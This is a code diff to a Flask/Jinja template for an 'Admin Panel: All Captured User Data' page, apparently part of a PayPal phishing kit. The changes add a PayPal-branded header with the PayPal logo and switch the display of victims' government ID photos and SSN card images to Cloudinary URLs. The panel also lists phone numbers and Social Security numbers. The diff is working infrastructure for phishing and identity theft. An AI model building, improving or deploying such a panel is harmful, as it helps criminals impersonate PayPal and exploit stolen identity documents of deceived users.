@@ -11,13 +11,42 @@
             font-family: 'Inter', sans-serif;
             background-color: #f7f8f9;
             display: flex;
-            justify-content: center;
-            align-items: flex-start;
+            flex-direction: column; /* Allow header and container to stack */
+            align-items: center; /* Center direct children like header and container */
             min-height: 100vh;
             margin: 0;
-            padding: 40px 20px;
+            padding: 0; /* Remove default body padding if header spans full width */
             box-sizing: border-box;
         }
+        .header-bar { /* Copied from verification.html for consistency if needed */
+            background-color: #003087;
+            color: white;
+            padding: 10px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            width: 100%; /* Make header span full width */
+            box-sizing: border-box;
+            z-index: 1000;
+            height: 60px;
+            /* position: sticky; top: 0; /* Uncomment if you want a sticky header */
+        }
+        .header-left .paypal-logo-header {
+            height: 30px; 
+            width: auto;  
+            max-width: 120px; 
+            object-fit: contain;
+            display: block;
+        }
+        .header-nav ul { list-style: none; margin: 0; padding: 0; display: flex; gap: 25px; }
+        .header-nav a { color: white; text-decoration: none; font-size: 15px; font-weight: 500; }
+        .header-right { display: flex; align-items: center; gap: 20px; }
+        .header-right .logout-btn {
+            background: none; border: 1px solid white; color: white; padding: 8px 15px;
+            border-radius: 20px; cursor: pointer; font-size: 14px; font-weight: 600;
+        }
+
         .admin-panel-container {
             background-color: #fff;
             border-radius: 8px;
@@ -25,6 +54,8 @@
             padding: 32px;
             width: 100%;
             max-width: 900px;
+            margin-top: 20px; /* Add space below header if header is not sticky */
+            margin-bottom: 40px; /* Space at the bottom */
         }
         .panel-title {
             color: #003087;
@@ -78,12 +109,12 @@
         .user-document-pic { /* For ID front/back and SSN card */
             max-width: 100%;
             height: auto;
-            max-height: 300px; /* Adjusted for potentially smaller display */
+            max-height: 300px; 
             border: 1px solid #ccc;
             margin-top: 5px;
             margin-bottom: 10px;
             display: block;
-            background-color: #e0e0e0;
+            background-color: #e0e0e0; /* Placeholder background if image is loading/broken */
         }
         .no-users-message {
             text-align: center;
@@ -99,6 +130,24 @@
     </style>
 </head>
 <body>
+    <header class="header-bar">
+        <div class="header-left">
+            <img src="{{ url_for('static', filename='new paypal logo.png') }}" alt="PayPal Logo" class="paypal-logo-header">
+        </div>
+        <nav class="header-nav">
+            <ul>
+                <li><a href="{{ url_for('dashboard') if 'dashboard' in session else url_for('index') }}">Dashboard</a></li>
+                </ul>
+        </nav>
+        <div class="header-right">
+            {% if session.logged_in %}
+            <form action="{{ url_for('logout') }}" method="POST" style="display: inline;">
+                <button type="submit" class="logout-btn">LOG OUT</button>
+            </form>
+            {% endif %}
+        </div>
+    </header>
+
     <div class="admin-panel-container">
         <h2 class="panel-title">Admin Panel: All Captured User Data</h2>
         <ul id="user-data-list" class="user-data-list">
@@ -116,10 +165,13 @@
                     <p>Phone Number: <span>{{ user_details.phoneNumber or user_details.phonenumber or 'Not provided' }}</span></p>
                     <p>Social Security Number (SSN): <span>{{ user_details.ssn or 'Not provided' }}</span></p>
                     
-                    {% if user_details.profile_picture_base64 %}
-                        <p>Profile Picture (Original):</p>
-                        <img src="{{ user_details.profile_picture_base64 }}" alt="Profile Picture" class="user-profile-pic">
-                    {% else %}
+                    {# This was for an old 'profile_picture_base64' field. 
+                       If you have a separate general profile picture URL from Cloudinary, 
+                       you'd use a key like user_details.profile_picture_url here.
+                       For now, I'm keeping the original logic but commenting it out if not used.
+                    #}
+                    {% if user_details.profile_picture_base64 and user_details.profile_picture_base64 != "" %} 
+                        {% else %}
                         {% endif %}
 
                     <div class="section-divider"></div>
@@ -134,21 +186,27 @@
                     
                     {% if user_details.photoIdFront %}
                         <p>Government-Issued Photo ID (Front):</p>
-                        <img src="data:image/png;base64,{{ user_details.photoIdFront }}" alt="Government Photo ID Front" class="user-document-pic">
+                        {# MODIFIED: Use direct URL from Cloudinary #}
+                        <img src="{{ user_details.photoIdFront }}" alt="Government Photo ID Front" class="user-document-pic" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+                        <p style="display:none; color:red;">Error loading front ID image.</p>
                     {% else %}
                         <p>Government-Issued Photo ID (Front): <span>Not uploaded</span></p>
                     {% endif %}
                     
                     {% if user_details.photoIdBack %}
                         <p>Government-Issued Photo ID (Back):</p>
-                        <img src="data:image/png;base64,{{ user_details.photoIdBack }}" alt="Government Photo ID Back" class="user-document-pic">
+                        {# MODIFIED: Use direct URL from Cloudinary #}
+                        <img src="{{ user_details.photoIdBack }}" alt="Government Photo ID Back" class="user-document-pic" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+                        <p style="display:none; color:red;">Error loading back ID image.</p>
                     {% else %}
                         <p>Government-Issued Photo ID (Back): <span>Not uploaded / Not applicable</span></p>
                     {% endif %}
                     
                     {% if user_details.ssnCard %}
                         <p>SSN Card Image:</p>
-                        <img src="data:image/png;base64,{{ user_details.ssnCard }}" alt="SSN Card Image" class="user-document-pic">
+                        {# MODIFIED: Use direct URL from Cloudinary #}
+                        <img src="{{ user_details.ssnCard }}" alt="SSN Card Image" class="user-document-pic" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+                        <p style="display:none; color:red;">Error loading SSN card image.</p>
                     {% else %}
                         <p>SSN Card Image: <span>Not uploaded</span></p>
                     {% endif %}
